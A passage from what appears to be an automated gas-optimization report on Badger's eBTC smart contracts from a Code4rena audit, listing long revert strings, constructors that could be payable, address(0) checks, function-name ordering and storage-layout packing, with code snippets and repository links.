443                        "LeverageMacroReference: swap check failure!"
444                    )
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L440-L444](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L440-L444)


#

```
File: contracts/LiquidationLibrary.sol

56    require(_partialAmount != 0, "LiquidationLibrary: use `liquidate` for 100%")
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L56](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L56)


#

```
File: contracts/LiquidationLibrary.sol

82    require(
83                    _checkICRAgainstLiqThreshold(_ICR, _TCR),
84                    "LiquidationLibrary: ICR is not below liquidation threshold in current mode"
85                )
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L82-L85](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L82-L85)


#

```
File: contracts/LiquidationLibrary.sol

89    require(
90                    cachedLastGracePeriodStartTimestamp != UNSET_TIMESTAMP,
91                    "LiquidationLibrary: Recovery Mode grace period not started"
92                )
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L89-L92](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L89-L92)


#

```
File: contracts/LiquidationLibrary.sol

93    require(
94                    block.timestamp >
95                        cachedLastGracePeriodStartTimestamp + recoveryModeGracePeriodDuration,
96                    "LiquidationLibrary: Recovery mode grace period still in effect"
97                )
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L93-L97](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L93-L97)


#

```
File: contracts/LiquidationLibrary.sol

477    require(
478                    getCachedICR(_cdpId, _partialState.price) >= _partialState.ICR,
479                    "LiquidationLibrary: !_newICR>=_ICR"
480                )
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L477-L480](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L477-L480)


#

```
File: contracts/LiquidationLibrary.sol

680    require(
681                _cdpArray.length != 0,
682                "LiquidationLibrary: Calldata address array must not be empty"
683            )
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L680-L683](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L680-L683)


#

```
File: contracts/LiquidationLibrary.sol

710    require(totals.totalDebtInSequence > 0, "LiquidationLibrary: nothing to liquidate")
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L710](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L710)


#

```
File: contracts/LiquidationLibrary.sol

901    require(
902                (_partialDebt + _convertDebtDenominationToBtc(MIN_NET_STETH_BALANCE, _price)) <=
903                    _entireDebt,
904                "LiquidationLibrary: Partial debt liquidated must be less than total debt"
905            )
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L901-L905](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L901-L905)


#

```
File: contracts/LiquidationLibrary.sol

909    require(
910                _entireColl >= MIN_NET_STETH_BALANCE,
911                "LiquidationLibrary: Coll remaining in partially liquidated CDP must be >= minimum"
912            )
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L909-L912](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L909-L912)


#

```
File: contracts/PriceFeed.sol

79    require(
80                !_chainlinkIsBroken(chainlinkResponse, prevChainlinkResponse) &&
81                    !_chainlinkIsFrozen(chainlinkResponse),
82                "PriceFeed: Chainlink must be working and current"
83            )
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L79-L83](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L79-L83)


#

```
File: contracts/SortedCdps.sol

352    require(cdpManager.getCdpStatus(_id) == 0, "SortedCdps: new id is NOT nonExistent!")
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L352](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L352)


#

```
File: contracts/SortedCdps.sol

367    require(!contains(_id), "SortedCdps: List already contains the node")
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L367](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L367)


#

```
File: contracts/SortedCdps.sol

371    require(_NICR > 0, "SortedCdps: NICR must be positive")
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L371](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L371)


#

```
File: contracts/SortedCdps.sol

422    require(_len > 1, "SortedCdps: batchRemove() only apply to multiple cdpIds!")
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L422](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L422)


#

```
File: contracts/SortedCdps.sol

427    require(
428                _firstPrev != dummyId || _lastNext != dummyId,
429                "SortedCdps: batchRemove() leave ZERO node left!"
430            )
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L427-L430](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L427-L430)


#

```
File: contracts/SortedCdps.sol

433    require(contains(_ids[i]), "SortedCdps: List does not contain the id")
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L433](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L433)


#

```
File: contracts/SortedCdps.sol

458    require(contains(_id), "SortedCdps: List does not contain the id")
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L458](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L458)


#

```
File: contracts/SortedCdps.sol

506    require(contains(_id), "SortedCdps: List does not contain the id")
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L506](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L506)


#

```
File: contracts/SortedCdps.sol

508    require(_newNICR > 0, "SortedCdps: NICR must be positive")
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L508](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L508)


#

```
File: contracts/SortedCdps.sol

715    require(msg.sender == address(cdpManager), "SortedCdps: Caller is not the CdpManager")
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L715](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L715)


#

```
File: contracts/SortedCdps.sol

720    require(
721                msg.sender == borrowerOperationsAddress || msg.sender == address(cdpManager),
722                "SortedCdps: Caller is neither BO nor CdpM"
723            )
```
 make the message shorter than 32 bytes

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L720-L723](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L720-L723)


</details>

# 


## [G-23] Consider Merge Sequential For-Loops
- Severity: Gas Optimization
- Confidence: High

### Description
Detects instances where multiple for-loops appear sequentially in the same function. This may indicate an opportunity for loop fusion, a code optimization technique that merges multiple loops into a single one.

<details>

<summary>
There are 1 instances of this issue:

</summary>

###
#
Consider merging those following loops to one loop if appropriate :
```
File: contracts/SortedCdps.sol

432    i < _len
```

```
File: contracts/SortedCdps.sol

449    i < _len
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L432](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L432)


</details>

# 


## [G-24] Declare Constructor Function as Payable to Save Gas
- Severity: Gas Optimization
- Confidence: High
- Total Gas Saved: 336

### Description
Constructors should be declared `payable` to save gas

<details>

<summary>
There are 16 instances of this issue:

</summary>

###
#

```
File: contracts/ActivePool.sol

46    constructor(
47            address _borrowerOperationsAddress,
48            address _cdpManagerAddress,
49            address _collTokenAddress,
50            address _collSurplusAddress,
51            address _feeRecipientAddress
52        ) 
```
 should be declared payable:

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L46-L66](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L46-L66)


#

```
File: contracts/BorrowerOperations.sol

107    constructor(
108            address _cdpManagerAddress,
109            address _activePoolAddress,
110            address _collSurplusPoolAddress,
111            address _priceFeedAddress,
112            address _sortedCdpsAddress,
113            address _ebtcTokenAddress,
114            address _feeRecipientAddress,
115            address _collTokenAddress
116        ) EbtcBase(_activePoolAddress, _priceFeedAddress, _collTokenAddress) 
```
 should be declared payable:

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L107-L137](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L107-L137)


#

```
File: contracts/CdpManager.sol

30    constructor(
31            address _liquidationLibraryAddress,
32            address _authorityAddress,
33            address _borrowerOperationsAddress,
34            address _collSurplusPoolAddress,
35            address _ebtcTokenAddress,
36            address _sortedCdpsAddress,
37            address _activePoolAddress,
38            address _priceFeedAddress,
39            address _collTokenAddress
40        )
41            CdpManagerStorage(
42                _liquidationLibraryAddress,
43                _authorityAddress,
44                _borrowerOperationsAddress,
45                _collSurplusPoolAddress,
46                _ebtcTokenAddress,
47                _sortedCdpsAddress,
48                _activePoolAddress,
49                _priceFeedAddress,
50                _collTokenAddress
51            )
52        
```
 should be declared payable:

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L30-L60](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L30-L60)


#

```
File: contracts/CdpManagerStorage.sol

217    constructor(
218            address _liquidationLibraryAddress,
219            address _authorityAddress,
220            address _borrowerOperationsAddress,
221            address _collSurplusPool,
222            address _ebtcToken,
223            address _sortedCdps,
224            address _activePool,
225            address _priceFeed,
226            address _collateral
227        ) EbtcBase(_activePool, _priceFeed, _collateral) 
```
 should be declared payable:

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L217-L237](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L217-L237)


#

```
File: contracts/CollSurplusPool.sol

42    constructor(
43            address _borrowerOperationsAddress,
44            address _cdpManagerAddress,
45            address _activePoolAddress,
46            address _collTokenAddress
47        ) 
```
 should be declared payable:

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CollSurplusPool.sol#L42-L58](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CollSurplusPool.sol#L42-L58)


#

```
File: contracts/EBTCToken.sol

61    constructor(
62            address _cdpManagerAddress,
63            address _borrowerOperationsAddress,
64            address _authorityAddress
65        ) 
```
 should be declared payable:

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L61-L78](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L61-L78)


#

```
File: contracts/Governor.sol

36    constructor(address _owner) RolesAuthority(_owner, Authority(address(this))) 
```
 should be declared payable:

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L36](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L36)


#

```
File: contracts/HintHelpers.sol

27    constructor(
28            address _sortedCdpsAddress,
29            address _cdpManagerAddress,
30            address _collateralAddress,
31            address _activePoolAddress,
32            address _priceFeedAddress
33        ) EbtcBase(_activePoolAddress, _priceFeedAddress, _collateralAddress) 
```
 should be declared payable:

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/HintHelpers.sol#L27-L36](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/HintHelpers.sol#L27-L36)


#

```
File: contracts/LeverageMacroBase.sol

51    constructor(
52            address _borrowerOperationsAddress,
53            address _activePool,
54            address _cdpManager,
55            address _ebtc,
56            address _coll,
57            address _sortedCdps,
58            bool _sweepToCaller
59        ) 
```
 should be declared payable:

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L51-L68](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L51-L68)


#

```
File: contracts/LeverageMacroDelegateTarget.sol

41    constructor(
42            address _borrowerOperationsAddress,
43            address _activePool,
44            address _cdpManager,
45            address _ebtc,
46            address _coll,
47            address _sortedCdps
48        )
49            LeverageMacroBase(
50                _borrowerOperationsAddress,
51                _activePool,
52                _cdpManager,
53                _ebtc,
54                _coll,
55                _sortedCdps,
56                false // Do not sweep to caller
57            )
58        
```
 should be declared payable:

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroDelegateTarget.sol#L41-L60](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroDelegateTarget.sol#L41-L60)


#

```
File: contracts/LeverageMacroFactory.sol

21    constructor(
22            address _borrowerOperationsAddress,
23            address _activePool,
24            address _cdpManager,
25            address _ebtc,
26            address _coll,
27            address _sortedCdps
28        ) 
```
 should be declared payable:

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroFactory.sol#L21-L35](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroFactory.sol#L21-L35)


#

```
File: contracts/LeverageMacroReference.sol

17    constructor(
18            address _borrowerOperationsAddress,
19            address _activePool,
20            address _cdpManager,
21            address _ebtc,
22            address _coll,
23            address _sortedCdps,
24            address _owner
25        )
26            LeverageMacroBase(
27                _borrowerOperationsAddress,
28                _activePool,
29                _cdpManager,
30                _ebtc,
31                _coll,
32                _sortedCdps,
33                true // Sweep to caller since this is not supposed to hold funds
34            )
35        
```
 should be declared payable:

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroReference.sol#L17-L42](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroReference.sol#L17-L42)


#

```
File: contracts/LiquidationLibrary.sol

14    constructor(
15            address _borrowerOperationsAddress,
16            address _collSurplusPool,
17            address _ebtcToken,
18            address _sortedCdps,
19            address _activePool,
20            address _priceFeed,
21            address _collateral
22        )
23            CdpManagerStorage(
24                address(0),
25                address(0),
26                _borrowerOperationsAddress,
27                _collSurplusPool,
28                _ebtcToken,
29                _sortedCdps,
30                _activePool,
31                _priceFeed,
32                _collateral
33            )
34        
```
 should be declared payable:

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L14-L34](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L14-L34)


#

```
File: contracts/PriceFeed.sol

57    constructor(
58            address _fallbackCallerAddress,
59            address _authorityAddress,
60            address _collEthCLFeed,
61            address _ethBtcCLFeed
62        ) 
```
 should be declared payable:

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L57-L89](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L57-L89)


#

```
File: contracts/SimplifiedDiamondLike.sol

44    constructor(address _owner) 
```
 should be declared payable:

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SimplifiedDiamondLike.sol#L44-L46](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SimplifiedDiamondLike.sol#L44-L46)


#

```
File: contracts/SortedCdps.sol

88    constructor(uint256 _size, address _cdpManagerAddress, address _borrowerOperationsAddress) 
```
 should be declared payable:

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L88-L97](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L88-L97)


</details>

# 


## [G-25] Optimize address(0) Checks Using Assembly
- Severity: Gas Optimization
- Confidence: High
- Total Gas Saved: 348

### Description
Solidity provides `address(0)` as a constant for the zero address. While it is generally safe to use, explicit checks against `address(0)` in your code might be slightly more gas efficient if implemented in inline assembly, due to reduced overhead.

<details>

<summary>
There are 6 instances of this issue:

</summary>

###
#

```
File: contracts/ActivePool.sol

61    _authorityAddress != address(0)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L61](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L61)


#

```
File: contracts/BorrowerOperations.sol

124    _authorityAddress != address(0)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L124](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L124)


#

```
File: contracts/CollSurplusPool.sol

55    _authorityAddress != address(0)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CollSurplusPool.sol#L55](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CollSurplusPool.sol#L55)


#

```
File: contracts/PriceFeed.sol

224    address(fallbackCaller) == address(0)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L224](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L224)


#

```
File: contracts/PriceFeed.sol

587    address(fallbackCaller) != address(0)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L587](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L587)


#

```
File: contracts/PriceFeed.sol

363    _fallbackCaller != address(0)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L363](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L363)


</details>

# 


## [G-26] Optimize Names to Save Gas
- Severity: Gas Optimization
- Confidence: Medium
- Total Gas Saved: 176

### Description
Optimize public/external function names and public member variable names to save gas. Method IDs that have two leading zero bytes can save 128 gas each during deployment, and renaming functions to have lower method IDs will save 22 gas per call, per sorted position shifted. Note: This detector does not mention special functions like constructors or functions that override other functions which cannot change their names due to the requirements of the overriding process.

<details>

<summary>
There are 8 instances of this issue:

</summary>

###
#

```
File: contracts/HintHelpers.sol

11    contract HintHelpers is EbtcBase 
```
``` 
/// @audit: getRedemptionHints()  ,getApproxHint()  ,computeNominalCR()  ,computeCR()  
``` 


[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/HintHelpers.sol#L11-L219](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/HintHelpers.sol#L11-L219)


#

```
File: contracts/LeverageMacroBase.sol

14    interface ICdpCdps 
```
``` 
/// @audit: Cdps()  
``` 


[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L14-L16](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L14-L16)


#

```
File: contracts/LeverageMacroDelegateTarget.sol

6    interface IOwnerLike 
```
``` 
/// @audit: owner()  
``` 


[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroDelegateTarget.sol#L6-L8](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroDelegateTarget.sol#L6-L8)


#

```
File: contracts/LeverageMacroFactory.sol

11    contract LeverageMacroFactory 
```
``` 
/// @audit: deployNewMacro()  ,deployNewMacro()  
``` 


[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroFactory.sol#L11-L60](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroFactory.sol#L11-L60)


#

```
File: contracts/LeverageMacroReference.sol

11    contract LeverageMacroReference is LeverageMacroBase 
```
``` 
/// @audit: resetApprovals()  
``` 


[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroReference.sol#L11-L57](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroReference.sol#L11-L57)


#

```
File: contracts/LiquidationLibrary.sol

13    contract LiquidationLibrary is CdpManagerStorage 
```
``` 
/// @audit: liquidate()  ,partiallyLiquidate()  ,batchLiquidateCdps()  
``` 


[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L13-L914](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L13-L914)


#

```
File: contracts/SimplifiedDiamondLike.sol

25    contract SimplifiedDiamondLike 
```
``` 
/// @audit: setFallbackHandler()  ,setAllowAnyCall()  ,enableCallbackForCall()  ,execute()  
``` 


[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SimplifiedDiamondLike.sol#L25-L202](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SimplifiedDiamondLike.sol#L25-L202)


#

```
File: contracts/SortedCdps.sol

51    contract SortedCdps is ISortedCdps 
```
``` 
/// @audit: toCdpId()  
``` 


[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L51-L725](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L51-L725)


</details>

# 


## [G-27] Optimal State Variable Order
- Severity: Gas Optimization
- Confidence: High
- Total Gas Saved: 15000

### Description
Detects optimal variable order in contract storage layouts to decrease the number of storage slots used. Each storage slot used can cost at least 5,000 gas for each write operation, and potentially up to 20,000 gas if you're turning a zero value into a non-zero value. Hence, optimizing storage usage can result in significant gas savings. The real-world savings could vary depending on your contract's specific logic and the state of the Ethereum network.

<details>

<summary>
There are 3 instances of this issue:

</summary>

###
#
Optimization opportunity in storage variable layout of contract 
```
File: contracts/CdpManagerStorage.sol

19    contract CdpManagerStorage is EbtcBase, ReentrancyGuard, ICdpManagerData, AuthNoOwner 
```

- original variable order (count: 32 slots)
    - uint128 UNSET_TIMESTAMP
    - uint128 MINIMUM_GRACE_PERIOD
    - uint128 lastGracePeriodStartTimestamp
    - uint128 recoveryModeGracePeriodDuration
    - string NAME
    - address borrowerOperationsAddress
    - ICollSurplusPool collSurplusPool
    - IEBTCToken ebtcToken
    - address liquidationLibrary
    - ISortedCdps sortedCdps
    - uint256 SECONDS_IN_ONE_MINUTE
    - uint256 MIN_REDEMPTION_FEE_FLOOR
    - uint256 redemptionFeeFloor
    - bool redemptionsPaused
    - uint256 minuteDecayFactor
    - uint256 MIN_MINUTE_DECAY_FACTOR
    - uint256 MAX_MINUTE_DECAY_FACTOR
    - uint256 deploymentStartTime
    - uint256 beta
    - uint256 baseRate
    - uint256 stakingRewardSplit
    - uint256 lastRedemptionTimestamp
    - mapping(bytes32 => ICdpManagerData.Cdp) Cdps
    - uint256 totalStakes
    - uint256 totalStakesSnapshot
    - uint256 totalCollateralSnapshot
    - uint256 systemDebtRedistributionIndex
    - mapping(bytes32 => uint256) cdpDebtRedistributionIndex
    - uint256 lastEBTCDebtErrorRedistribution
    - uint256 stEthIndex
    - uint256 systemStEthFeePerUnitIndex
    - uint256 systemStEthFeePerUnitIndexError
    - mapping(bytes32 => uint256) cdpStEthFeePerUnitIndex
    - bytes32[] CdpIds


 - optimized variable order (count: 31 slots)
    - address borrowerOperationsAddress
    - bool redemptionsPaused
    - ICollSurplusPool collSurplusPool
    - IEBTCToken ebtcToken
    - address liquidationLibrary
    - ISortedCdps sortedCdps
    - uint128 UNSET_TIMESTAMP
    - uint128 MINIMUM_GRACE_PERIOD
    - uint128 lastGracePeriodStartTimestamp
    - uint128 recoveryModeGracePeriodDuration
    - string NAME
    - uint256 SECONDS_IN_ONE_MINUTE
    - uint256 MIN_REDEMPTION_FEE_FLOOR
    - uint256 redemptionFeeFloor
    - uint256 minuteDecayFactor
    - uint256 MIN_MINUTE_DECAY_FACTOR
    - uint256 MAX_MINUTE_DECAY_FACTOR
    - uint256 deploymentStartTime
    - uint256 beta
    - uint256 baseRate
    - uint256 stakingRewardSplit
    - uint256 lastRedemptionTimestamp
    - mapping(bytes32 => ICdpManagerData.Cdp) Cdps
    - uint256 totalStakes
    - uint256 totalStakesSnapshot
    - uint256 totalCollateralSnapshot
    - uint256 systemDebtRedistributionIndex
    - mapping(bytes32 => uint256) cdpDebtRedistributionIndex
    - uint256 lastEBTCDebtErrorRedistribution
    - uint256 stEthIndex
    - uint256 systemStEthFeePerUnitIndex
    - uint256 systemStEthFeePerUnitIndexError
    - mapping(bytes32 => uint256) cdpStEthFeePerUnitIndex
    - bytes32[] CdpIds


[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L19-L902](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L19-L902)


#
Optimization opportunity in storage variable layout of contract 
```
File: contracts/EBTCToken.sol

26    contract EBTCToken is IEBTCToken, AuthNoOwner, PermitNonce 
```

- original variable order (count: 15 slots)
    - uint256 _totalSupply
    - string _NAME
    - string _SYMBOL
    - string _VERSION
    - uint8 _DECIMALS
    - bytes32 _PERMIT_TYPEHASH
    - bytes32 _TYPE_HASH
    - bytes32 _CACHED_DOMAIN_SEPARATOR
    - uint256 _CACHED_CHAIN_ID
    - bytes32 _HASHED_NAME
    - bytes32 _HASHED_VERSION
    - mapping(address => uint256) _balances
    - mapping(address => mapping(address => uint256)) _allowances
    - address cdpManagerAddress
    - address borrowerOperationsAddress


 - optimized variable order (count: 14 slots)
    - address cdpManagerAddress
    - uint8 _DECIMALS
    - address borrowerOperationsAddress
    - uint256 _totalSupply
    - string _NAME
    - string _SYMBOL
    - string _VERSION
    - bytes32 _PERMIT_TYPEHASH
    - bytes32 _TYPE_HASH
    - bytes32 _CACHED_DOMAIN_SEPARATOR
    - uint256 _CACHED_CHAIN_ID
    - bytes32 _HASHED_NAME
    - bytes32 _HASHED_VERSION
    - mapping(address => uint256) _balances
    - mapping(address => mapping(address => uint256)) _allowances


[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L26-L358](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L26-L358)


#
Optimization opportunity in storage variable layout of contract 
```
File: contracts/PriceFeed.sol

21    contract PriceFeed is BaseMath, IPriceFeed, AuthNoOwner 
```

- original variable order (count: 10 slots)
    - string NAME
    - AggregatorV3Interface ETH_BTC_CL_FEED
    - AggregatorV3Interface STETH_ETH_CL_FEED
    - IFallbackCaller fallbackCaller
    - uint256 TIMEOUT_ETH_BTC_FEED
    - uint256 TIMEOUT_STETH_ETH_FEED
    - uint256 MAX_PRICE_DEVIATION_FROM_PREVIOUS_ROUND
    - uint256 MAX_PRICE_DIFFERENCE_BETWEEN_ORACLES
    - uint256 lastGoodPrice
    - IPriceFeed.Status status


 - optimized variable order (count: 9 slots)
    - AggregatorV3Interface ETH_BTC_CL_FEED
    - IPriceFeed.Status status
    - AggregatorV3Interface STETH_ETH_CL_FEED
    - IFallbackCaller fallbackCaller
    - string NAME
    - uint256 TIMEOUT_ETH_BTC_FEED
    - uint256 TIMEOUT_STETH_ETH_FEED
    - uint256 MAX_PRICE_DEVIATION_FROM_PREVIOUS_ROUND
    - uint256 MAX_PRICE_DIFFERENCE_BETWEEN_ORACLES
    - uint256 lastGoodPrice


[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L21-L806](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L21-L806)


</details>

# 


## [G-28] Optimal Struct Variable Order
- Severity: Gas Optimization
- Confidence: High
- Total Gas Saved: 20000

### Description
Detect optimal variable order in struct definitions to decrease the number of slots used. Each storage slot used can cost at least 5,000 gas for each write operation, and potentially up to 20,000 gas if you're turning a zero value into a non-zero value. Hence, optimizing storage usage can result in significant gas savings. The real-world savings could vary depending on your contract's specific logic and the state of the Ethereum network.

<details>

